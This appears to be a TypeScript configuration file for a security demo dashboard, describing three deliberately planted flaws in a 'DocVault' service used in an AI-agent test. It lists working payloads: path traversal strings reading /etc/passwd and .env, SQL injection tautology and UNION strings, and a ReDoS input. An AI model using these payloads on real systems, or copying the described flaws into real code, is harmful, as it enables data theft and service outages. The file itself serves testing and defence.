// The three real vulnerabilities in the DocVault service (infrastructure/app/service/routes).
// The agent is not told which one is attacked; this file only labels the dashboard.

export type ScenarioId = 'path_traversal' | 'sqli' | 'redos';

export interface Payload {
  name: string;
  value: string;
  description: string;
  malicious: boolean;
}

export interface Scenario {
  id: ScenarioId;
  short: string;
  title: string;
  cwe: string;
  endpoint: string;
  param: string;
  fixedParams: Record<string, string>;
  sourceFile: string;
  severity: 'Critical' | 'High';
  summary: string;
  payloads: Payload[];
}

export const SCENARIOS: Record<ScenarioId, Scenario> = {
  path_traversal: {
    id: 'path_traversal',
    short: 'Path Traversal',
    title: 'Arbitrary file read via path traversal',
    cwe: 'CWE-22',
    endpoint: '/api/v1/documents/read',
    param: 'file',
    fixedParams: {},
    sourceFile: 'service/routes/documents.py',
    severity: 'Critical',
    summary:
      'The document endpoint joins the user-supplied file name onto the documents folder with os.path.join and never checks the result, so ../ climbs out of the folder.',
    payloads: [
      { name: 'Read /etc/passwd', value: '../../../../etc/passwd', description: 'Climb to the filesystem root and read the user list.', malicious: true },
      { name: 'Steal app secrets', value: '../.env', description: 'Read the service .env file (fake demo secrets).', malicious: true },
      { name: 'Legitimate report', value: 'quarterly_report_2026.pdf', description: 'A normal customer request.', malicious: false },
    ],
  },
  sqli: {
    id: 'sqli',
    short: 'SQL Injection',
    title: 'SQL injection in the tenant customer lookup',
    cwe: 'CWE-89',
    endpoint: '/api/v1/auth/customer-lookup',
    param: 'email',
    fixedParams: { tenant: 'tenant-prod-99' },
    sourceFile: 'service/routes/customers.py',
    severity: 'Critical',
    summary:
      'The lookup pastes tenant and email straight into a SQL string, so a quote in the email rewrites the WHERE clause and returns every tenant’s customers.',
    payloads: [
      { name: 'Dump every tenant', value: "x' OR '1'='1", description: 'Tautology that makes the WHERE clause always true.', malicious: true },
      { name: 'UNION exfiltration', value: "x' UNION SELECT id, tenant_id, full_name, email, role FROM customers --", description: 'Append a second query that reads the whole table.', malicious: true },
      { name: 'Legitimate lookup', value: 'sarah.connor@cyberdyne.example', description: 'A normal lookup inside tenant-prod-99.', malicious: false },
    ],
  },
  redos: {
    id: 'redos',
    short: 'ReDoS',
    title: 'Regular-expression denial of service in the email validator',
    cwe: 'CWE-1333',
    endpoint: '/api/v1/validator/email-or-domain',
    param: 'input',
    fixedParams: {},
    sourceFile: 'service/routes/validator.py',
    severity: 'High',
    summary:
      'The email pattern nests a repeated group inside another repetition. A long run of letters with no @ makes Python’s regex engine backtrack for seconds, freezing a worker per request.',
    payloads: [
      { name: 'Backtracking bomb (28 chars)', value: 'aaaaaaaaaaaaaaaaaaaaaaaaaaa!', description: 'Takes seconds to reject; a handful of these stall the service.', malicious: true },
      { name: 'Legitimate email', value: 'lead.architect@defense.example.com', description: 'A normal sign-up email.', malicious: false },
    ],
  },
};
